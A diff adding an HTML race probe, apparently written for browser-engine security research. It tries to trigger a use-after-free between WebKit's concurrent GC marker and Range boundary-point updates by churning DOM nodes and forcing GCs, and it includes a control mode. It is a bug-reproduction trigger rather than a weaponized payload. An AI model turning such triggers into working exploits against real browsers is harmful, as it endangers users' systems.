@@ -1,0 +1,57 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Range / GC race probe</title>
+<!--
+  GOAL action 1 after docs/67: Range keeps two Ref<Node> boundary points (RangeBoundaryPoint.h:53) and the
+  concurrent GC marker reads them through visitNodesConcurrently (Range.cpp:1133) with no lock (Range.h:42).
+  The fix (621e3bf30e / ab488735a4) adds m_boundaryPointLock and takes it in every mutator and in the visitor.
+
+  Shape: keep K Ranges alive, and in a tight loop give each one a fresh Text node as both boundary points,
+  then remove that node from the tree — the *next* setStart on the same Range releases the last Ref and frees
+  it. Large short-lived ArrayBuffers force full (concurrent) GCs while the loop runs, so the marker can read a
+  boundary container that is being freed.
+
+  Knobs: mode=range|nor (nor = same DOM churn, no Ranges: allocation control), k = live Ranges,
+         n = iterations, g = iterations between 1 MiB allocations.
+-->
+<body><div id="host"></div>
+<script>
+const Q = new URLSearchParams(location.search);
+const MODE = Q.get('mode') || 'range';
+const K = +(Q.get('k') || 8);
+const N = +(Q.get('n') || 40000);
+const G = +(Q.get('g') || 64);
+const ev = m => { new Image().src = '/ev?m=' + encodeURIComponent(m); };
+
+ev('start mode=' + MODE + ' k=' + K + ' n=' + N + ' g=' + G);
+
+const host = document.getElementById('host');
+const ranges = [];
+if (MODE === 'range') {
+    for (let i = 0; i < K; i++)
+        ranges.push(document.createRange());
+}
+ev('ranges=' + ranges.length);
+
+const big = [];
+let spins = 0;
+for (let i = 0; i < N; i++) {
+    const tn = document.createTextNode('x' + (i & 255));
+    host.appendChild(tn);
+    if (MODE === 'range') {
+        const r = ranges[i % K];
+        r.setStart(tn, 0);
+        r.setEnd(tn, 0);
+    }
+    host.removeChild(tn);
+    spins++;
+    if ((i % G) === 0) {
+        big.push(new ArrayBuffer(1 << 20));
+        if (big.length > 4)
+            big.shift();
+    }
+    if ((i % 5000) === 0)
+        ev('iter ' + i);
+}
+ev('loop-done spins=' + spins);
+</script>
